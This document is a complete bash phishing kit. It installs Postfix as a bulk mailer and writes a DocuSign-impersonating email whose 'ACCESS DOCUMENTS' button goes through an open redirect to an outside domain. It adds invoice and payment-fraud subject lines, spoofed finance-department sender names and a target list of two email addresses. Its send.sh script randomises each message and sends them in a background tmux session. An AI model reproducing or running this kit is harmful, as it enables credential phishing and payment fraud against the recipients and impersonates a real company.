#!/bin/bash

# Make sure the script is being run with sudo privileges
if [ "$EUID" -ne 0 ]; then
  echo "Please run this script as root or with sudo privileges."
  exit 1
fi

read -p "Enter your domain (e.g., domain.com): " domain
if [[ -z "$domain" ]]; then
  echo "Domain cannot be empty."
  exit 1
fi

read -p "Enter your username (e.g., no-reply): " username
if [[ -z "$username" ]]; then
  echo "username cannot be empty."
  exit 1
fi

# Update package list and install Postfix
echo "Updating package list and installing Postfix..."
sudo apt-get update -y
sudo apt-get install postfix -y

# Install tmux for session persistence
echo "Installing tmux for persistent sessions..."
sudo apt-get install tmux -y

# Backup the original Postfix config file
echo "Backing up the original Postfix main.cf..."
sudo cp /etc/postfix/main.cf /etc/postfix/main.cf.backup

sudo tee /etc/postfix/generic > /dev/null <<EOL
root@$domain    $username@$domain
@$domain        $username@$domain
EOL

sudo postmap /etc/postfix/generic
sudo service postfix restart || { echo "Postfix failed to restart"; exit 1; }

# Remove the current main.cf to replace with custom config
echo "Removing current main.cf..."
sudo rm /etc/postfix/main.cf

# Create a new Postfix main.cf file with the desired configuration
echo "Creating a new Postfix main.cf file..."
sudo tee /etc/postfix/main.cf > /dev/null <<EOL
# Postfix main configuration file
myhostname = bulkmail.$domain
mydomain = $domain
myorigin = $domain

inet_protocols = ipv4
smtp_helo_name = bulkmail.$domain
smtp_tls_security_level = may
smtp_tls_loglevel = 1

smtp_destination_concurrency_limit = 1
default_process_limit = 50
smtp_generic_maps = hash:/etc/postfix/generic
ignore_rhosts = yes

inet_interfaces = loopback-only
mydestination = localhost
smtp_sasl_auth_enable = no
smtpd_sasl_auth_enable = no
smtp_sasl_security_options = noanonymous

queue_directory = /var/spool/postfix
command_directory = /usr/sbin
daemon_directory = /usr/lib/postfix/sbin
mailbox_size_limit = 0
recipient_delimiter = +
smtpd_client_restrictions = permit_mynetworks, permit_sasl_authenticated, reject
disable_dns_lookups = no
EOL

# Restart Postfix to apply the changes
echo "Restarting Postfix service..."
sudo service postfix restart || { echo "Postfix failed to restart"; exit 1; }

# Install mailutils for sending emails via Postfix
echo "Installing mailutils..."
sudo apt-get install mailutils -y
sudo apt-get install html2text -y
sudo apt-get install parallel base64 -y
sudo chown $USER:$USER *

# Create a sample HTML email content (email.html)
echo "Creating email.html with email content..."
cat > email.html <<EOL
<!DOCTYPE HTML>

<html><head><title></title>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
</head>
<body style="margin: 0.4em; font-size: 14pt;">
<table style='color: rgb(34, 34, 34); text-transform: none; line-height: normal; letter-spacing: normal; font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", "Segoe UI", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol"; font-size: 13px; font-style: normal; font-weight: normal; word-spacing: 0px; white-space: normal; border-collapse: collapse; max-width: 640px; orphans: 2; widows: 2; font-feature-settings: "liga" 0; background-color: rgb(255, 255, 255); 
font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;'><tbody><tr><td style="margin: 0px; padding: 10px 24px;"></td></tr><tr><td style="margin: 0px; padding: 0px 24px 30px;">
<table width="100%" align="center" style='color: rgb(255, 255, 255); line-height: normal; font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", "Segoe UI", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol"; font-size: 13px; font-weight: normal; border-collapse: collapse; font-feature-settings: "liga" 0; background-color: rgb(30, 76, 161);' border="0" cellspacing="0" cellpadding="0"><tbody><tr>
<td align="center" style='margin: 0px; padding: 28px 10px 36px; border-radius: 2px; width: 572px; text-align: center; color: rgb(255, 255, 255); font-family: Helvetica, Arial, "Sans Serif"; font-size: 16px; background-color: rgb(30, 76, 161);'><strong>
</strong><img width="598" height="208" style="width: 254px; height: 75px;" src="https://brandlogos.net/wp-content/uploads/2024/04/docusign-logo_brandlogos.net_5wujv-512x103.png">
<table width="100%" style='line-height: normal; font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", "Segoe UI", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol"; font-size: 13px; font-weight: normal; border-collapse: collapse; font-feature-settings: "liga" 0;' border="0" cellspacing="0" cellpadding="0"><tbody><tr>
<td align="center" style='margin: 0px; text-align: center; color: rgb(255, 255, 255); padding-top: 24px; font-family: Helvetica, Arial, "Sans Serif"; font-size: 16px;'><p><font size="5"><strong>Contract&nbsp;P</strong><strong>ayment Approved</strong></font></p><p>{recipient-user}</p><p><font size="4"><strong>"<font size="3"><span style="font-size: 12pt;"><span style="font-size: 14pt;">
Please reconfirm this order before we release payment.</span></span></font>"</strong></font></p><p>Use the button below to review&nbsp; the order&nbsp;and sign document(s)</p></td></tr></tbody></table>
<table width="100%" style='line-height: normal; font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", "Segoe UI", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol"; font-size: 13px; font-weight: normal; border-collapse: collapse; font-feature-settings: "liga" 0;' border="0" cellspacing="0" cellpadding="0"><tbody><tr><td align="center" style="margin: 0px; padding-top: 30px;"><div>
<table style='line-height: normal; font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", "Segoe UI", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol"; font-size: 13px; font-weight: normal; border-collapse: collapse; font-feature-settings: "liga" 0;' cellspacing="0" cellpadding="0"><tbody><tr>
<td height="44" align="center" style='margin: 0px; border-radius: 2px; border: 1px solid rgb(255, 255, 255); border-image: none; height: 44px; text-align: center; color: rgb(255, 255, 255); font-family: Helvetica, Arial, "Sans Serif"; font-size: 14px; font-weight: bold; text-decoration: none; display: block; background-color: rgb(30, 76, 161);'>
<a style='padding: 0px 12px; text-align: center; color: rgb(255, 255, 255); font-family: Helvetica, Arial, "Sans Serif"; font-size: 14px; font-weight: bold; text-decoration: none; display: inline-block; background-color: rgb(30, 76, 161);' href="https://medium.com/m/global-identity-2?redirectUrl=https://signed-docs.com" target="_blank" rel="noopener" data-saferedirecturl=""><span style="line-height: 44px;">ACCESS DOCUMENTS</span></a></td></tr></tbody></table></div></td></tr>
</tbody></table></td></tr></tbody></table></td></tr><tr>
<td style='margin: 0px; padding: 0px 24px 24px; color: rgb(0, 0, 0); font-family: Helvetica, Arial, "Sans Serif"; font-size: 16px; background-color: white;'><table style='line-height: normal; font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", "Segoe UI", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol"; font-size: 13px; font-weight: normal; border-collapse: collapse; font-feature-settings: "liga" 0;' border="0" cellspacing="0" cellpadding="0"><tbody><tr>
<td style="margin: 0px; padding-bottom: 20px;"><div style='color: rgb(51, 51, 51); line-height: 18px; font-family: Helvetica, Arial, "Sans Serif"; font-size: 15px; font-weight: bold;'>Email For</div><div style='color: rgb(102, 102, 102); line-height: 18px; font-family: Helvetica, Arial, "Sans Serif"; font-size: 15px;'><font color="#0000ff">{recipient-email}</font></div></td></tr></tbody></table>
<p style='margin: 0px 0px 1em; color: rgb(51, 51, 51); line-height: 20px; font-family: Helvetica, Arial, "Sans Serif"; font-size: 15px;'>All parties have completed Documents for your<span>&nbsp;</span><span class="il">DocuSign</span><span>&nbsp;</span>Signature.</p><p style='margin: 0px 0px 1em; color: rgb(51, 51, 51); line-height: 20px; font-family: Helvetica, Arial, "Sans Serif"; font-size: 15px;'>
I am sending you this request for your electronic signature, please review and electronically sign by following the link below.</p></td></tr><tr><td style='margin: 0px; padding: 0px 24px 12px; color: rgb(102, 102, 102); font-family: Helvetica, Arial, "Sans Serif"; font-size: 11px; background-color: rgb(255, 255, 255);'></td></tr><tr><td style="margin: 0px; padding: 30px 24px 45px; background-color: rgb(234, 234, 234);">
<p style='margin: 0px 0px 1em; color: rgb(102, 102, 102); line-height: 18px; font-family: Helvetica, Arial, "Sans Serif"; font-size: 13px;'><b aria-level="3">Do Not Share This Email</b><br>This email contains a secure link to<span>&nbsp;</span><span class="il">Docusign</span>. Please do not share this email, link, or access code with others.<br><br>
If you have trouble signing, visit "<a style="color: rgb(36, 99, 209); text-decoration: underline;" href="" target="_blank" rel="noopener" data-saferedirecturl="">How to Sign a Document</a>" on our<span>&nbsp;</span>
<a style="color: rgb(36, 99, 209); text-decoration: underline;" target="_blank" rel="noopener" data-saferedirecturl=""><span class="il">Docusign</span><span>&nbsp;</span>Support Center</a>, or browse our<span>&nbsp;</span>
<a style="color: rgb(36, 99, 209); text-decoration: underline;" href="" target="_blank" rel="noopener" data-saferedirecturl=""><span class="il">Docusign</span><span>&nbsp;</span>Community</a><span>&nbsp;</span>for more information.<br><br></p>
<p style='margin: 0px 0px 1em; color: rgb(102, 102, 102); line-height: 18px; font-family: Helvetica, Arial, "Sans Serif"; font-size: 13px;'>
<a style="color: rgb(36, 99, 209); text-decoration: underline;" href="" target="_blank" rel="noopener" data-saferedirecturl="">
<img width="18" height="18" class="CToWUd" style="margin-right: 7px; vertical-align: middle;" alt="" src="" data-image-whitelisted="" data-bit="iit">Download the<span>&nbsp;</span><span class="il">Docusign</span><span>&nbsp;</span>App</a></p><p style='margin: 0px 0px 1em; color: rgb(102, 102, 102); line-height: 14px; font-family: Helvetica, Arial, "Sans Serif"; font-size: 10px;'>This message was sent to you by Michael Romey who is using the<span>&nbsp;</span><span class="il">Docusign</span>
<span>&nbsp;</span>
Electronic Signature Service. If you would rather not receive email from this sender you may contact the sender with your request.</p></td></tr></tbody></table></body></html>

EOL

# Create a sample txt subject content (subject.txt)
echo "Creating subject.txt with subject content..."
cat > subject.txt <<EOL
Vendor Payment Advice Note
INVC0059268 - [EXTERNAL] Fwd: RETURNED INVOICE FROM VENDOR
RE: Outstanding payment 
INV - Kerry - I215362 - QR 
FW: RETURNED INVOICE
INV & D.O - Edgenta I211637 & I211938 ( Oct INV & D.O)
RE: E Invoice 
Docusign -RFQ- PVC BOOT 12" 
Your EFT Settlement Invoice is Ready for Review 
RE: Invoice Reconciliation Report - {date}
FW: Vendor Claim Adjustment - Doc #{random-number}
Payment Confirmation Notice - Ref #{random-number}
FW: Purchase Order #{random-number} - Signature Required
RE: Invoice Query - {recipient-domain}
FW: Credit Note #{random-number} Attached
Vendor Statement - Period Ending {date}
Remittance Advice - {recipient-domain} - {date}
RE: Billing Discrepancy - Inv #{random-number}
FW: Signed PO #{random-number} - For Review
Payment Status Update - Ref #{random-number}
RE: Returned EFT File - Ref #{random-number}
FW: Vendor Invoice Approval - {date}
Payment Advice - Inv #{random-number} - {recipient-domain}
RE: Confirmation of Funds Transfer - {date}
FW: PO #{random-number} - Document Attached
RE: Signed Quotation #{random-number}
Payment Voucher #{random-number} - Please Review
FW: Invoice #{random-number} Returned (Invalid PO)
RE: Pending Invoice Validation - {date}
Vendor Credit Memo #{random-number} - For Processing
RE: Updated Banking Information - {recipient-domain}
FW: Payment Release Form - Doc #{random-number}
RE: Debit Note #{random-number} - Attached
FW: Account Statement - {date} - {recipient-domain}
RE: DocuSign Request - PO #{random-number}
Payment Reconciliation - Ref #{random-number}
FW: E-Payment Status - Batch #{random-number}
RE: Supplier Settlement Confirmation - {date}
FW: Approval Required - Invoice #{random-number}
RE: Payment Advice from {recipient-domain} - {date}
EOL

# Create a sample txt name content (name.txt)
echo "Creating name.txt with name content..."
cat > name.txt <<EOL
Accounts Payable
Finance Department
Vendor Management
Accounts Department
Payments Team
Procurement Office
Billing Department
Shared Services Center
Accounts Payable Unit
Finance Operations
Treasury Division
Vendor Relations
Corporate Finance Office
Billing & Settlements
Accounts Processing
Payment Desk
DocuSign Notification
eInvoicing System
Finance Automation
Vendor Support Desk
EOL

# Create a sample txt list content (list.txt)
echo "Creating list.txt with list content..."
cat > list.txt <<EOL
prodaja@vbuilding.rs
accounts@sreecraft.in
EOL

# Create the sending script (send.sh)
echo "Creating send.sh for bulk email sending..."
cat > send.sh <<EOL
#!/bin/bash

# Configuration files
EMAIL_LIST="list.txt"
HTML_TEMPLATE="email.html"
SUBJECT_FILE="subject.txt"
NAME_FILE="name.txt"
LOG_FILE="send_log_\$(date +%Y%m%d).txt"

# Initialize counters
TOTAL=\$(wc -l < "\$EMAIL_LIST")
SUCCESS=0
FAILED=0

# Verify required files exist
for file in "\$EMAIL_LIST" "\$HTML_TEMPLATE" "\$SUBJECT_FILE" "\$NAME_FILE"; do
    if [ ! -f "\$file" ]; then
        echo "Error: Missing \$file" | tee -a "\$LOG_FILE"
        exit 1
    fi
done

# Load all subjects and names into arrays
mapfile -t SUBJECTS < "\$SUBJECT_FILE"
mapfile -t NAMES < "\$NAME_FILE"

# Random name generator (from name.txt)
get_random_name() {
    echo "\${NAMES[\$((RANDOM % \${#NAMES[@]}))]}"
}

# Random number generator (4-6 digits)
get_random_number() {
    echo \$((RANDOM % 9000 + 1000))
}

# Process each email
while IFS= read -r email; do
    # Clean and parse email address
    CLEAN_EMAIL=\$(echo "\$email" | tr -d '\\r\\n')
    EMAIL_USER=\$(echo "\$CLEAN_EMAIL" | cut -d@ -f1)
    EMAIL_DOMAIN=\$(echo "\$CLEAN_EMAIL" | cut -d@ -f2)
    CURRENT_DATE=\$(date +%Y-%m-%d)
    BASE64_EMAIL=\$(echo -n "\$CLEAN_EMAIL" | base64)

    # Generate random elements
    RANDOM_NAME=\$(get_random_name)
    RANDOM_NUMBER=\$(get_random_number)
    SELECTED_SENDER_NAME="\${NAMES[\$((RANDOM % \${#NAMES[@]}))]}"
    
    # Select subject and REPLACE ITS VARIABLES
    SELECTED_SUBJECT="\${SUBJECTS[\$((RANDOM % \${#SUBJECTS[@]}))]}"
    SELECTED_SUBJECT=\$(echo "\$SELECTED_SUBJECT" | sed \
        -e "s|{date}|\$CURRENT_DATE|g" \
        -e "s|{recipient-email}|\$CLEAN_EMAIL|g" \
        -e "s|{recipient-user}|\$EMAIL_USER|g" \
        -e "s|{recipient-domain}|\$EMAIL_DOMAIN|g" \
        -e "s|{name}|\$RANDOM_NAME|g" \
        -e "s|{random-name}|\$(get_random_name)|g" \
        -e "s|{random-number}|\$RANDOM_NUMBER|g")

    echo "Processing: \$CLEAN_EMAIL"
    
    # Generate unique Message-ID
    MESSAGE_ID="<\$(date +%s%N).\$(openssl rand -hex 8)@$domain>"
    
    # Create temporary HTML file with replaced variables
    TEMP_HTML=\$(mktemp)
    sed \
        -e "s|{date}|\$CURRENT_DATE|g" \
        -e "s|{recipient-email}|\$CLEAN_EMAIL|g" \
        -e "s|{recipient-user}|\$EMAIL_USER|g" \
        -e "s|{recipient-domain}|\$EMAIL_DOMAIN|g" \
        -e "s|{name}|\$RANDOM_NAME|g" \
        -e "s|{random-name}|\$(get_random_name)|g" \
        -e "s|{random-number}|\$RANDOM_NUMBER|g" \
        -e "s|{sender-email}|$username@$domain|g" \
        -e "s|{sender-name}|\$SELECTED_SENDER_NAME|g" \
        -e "s|{base64-encryptedrecipents-email}|\$BASE64_EMAIL|g" \
        "\$HTML_TEMPLATE" > "\$TEMP_HTML"
    
    # Send with dynamic content
    # Create text version
    TEMP_TEXT=\$(mktemp)
    cat <<EOF > "\$TEMP_TEXT"
Webmail - Mail. Host. Online

Email Account Status Changed

Hi \$EMAIL_USER,

Contract Payment Approved

" Please reconfirm this order before we release payment."

Use the button below to review  the order and sign document(s)

ACCESS DOCUMENTS

EOF

# Send with both HTML and text
cat <<EOF | /usr/sbin/sendmail -t -oi
Return-Path: <$username@$domain>
From: "\$SELECTED_SENDER_NAME" <$username@$domain>
To: <\$CLEAN_EMAIL>
Subject: \$SELECTED_SUBJECT
MIME-Version: 1.0
Content-Type: multipart/alternative; boundary="MULTIPART_BOUNDARY"

--MULTIPART_BOUNDARY
Content-Type: text/plain; charset=UTF-8

\$(cat "\$TEMP_TEXT")

--MULTIPART_BOUNDARY
Content-Type: text/html; charset=UTF-8

\$(cat "\$TEMP_HTML")

--MULTIPART_BOUNDARY--
EOF

    rm "\$TEMP_TEXT"

    # Check exit status and clean up
    if [ \$? -eq 0 ]; then
        echo "\$(date) - SUCCESS: \$CLEAN_EMAIL" >> "\$LOG_FILE"
        ((SUCCESS++))
    else
        echo "\$(date) - FAILED: \$CLEAN_EMAIL" >> "\$LOG_FILE"
        ((FAILED++))
    fi
    
    rm "\$TEMP_HTML"
    
    # Dynamic delay (0.5-3 seconds)
    sleep \$(awk -v min=0.1 -v max=0.3 'BEGIN{srand(); print min+rand()*(max-min)}')
    
    # Progress indicator
    echo "[\$SUCCESS/\$TOTAL] Sent to \$CLEAN_EMAIL"
    
done < "\$EMAIL_LIST"

# Final report
echo "Completed at \$(date)" >> "\$LOG_FILE"
echo "Total: \$TOTAL | Success: \$SUCCESS | Failed: \$FAILED" >> "\$LOG_FILE"
echo "Full log: \$LOG_FILE"
EOL


# Make the send.sh script executable
chmod +x send.sh

# Create a tmux session and run the send.sh script in it
echo "Starting tmux session and running send.sh..."
tmux new-session -d -s mail_session "./send.sh"

# Print instructions for reattaching to the tmux session
echo "Your email sending process is running in the background with tmux."
echo "To reattach to the session, use: tmux attach -t mail_session"
